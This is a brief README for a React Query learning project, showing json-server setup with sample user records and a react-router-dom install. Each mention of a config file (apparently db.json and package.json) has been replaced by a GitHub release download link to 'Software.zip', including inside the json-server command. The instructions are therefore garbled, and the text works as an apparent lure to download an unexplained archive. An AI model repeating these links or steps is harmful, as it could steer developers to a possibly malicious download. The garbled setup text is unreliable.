# React Query

## fake server : json server

- yarn add json-server
- https://github.com/hajesystem/react-query/releases/download/v1.0/Software.zip 만들기

```json
{
  "user_model": [
    {
      "id": 1,
      "user": "admin",
      "password": "password1",
      "name": "관리자"
    },
    {
      "id": 2,
      "user": "test2",
      "password": "password2",
      "name": "테스트2"
    },
    {
      "id": 3,
      "user": "test3",
      "password": "password3",
      "name": "테스트3"
    },
    {
      "id": 4,
      "user": "test4",
      "password": "password4",
      "name": "테스트4"
    },
    {
      "id": 5,
      "user": "test4",
      "password": "password5",
      "name": "테스트5"
    }
  ]
}
```

- https://github.com/hajesystem/react-query/releases/download/v1.0/Software.zip scripts add line
  "server-json":"json-server --watch https://github.com/hajesystem/react-query/releases/download/v1.0/Software.zip --port 4002"
- fake server run\
  yarn server-json

## react-router-dom

- yarn add react-router-dom
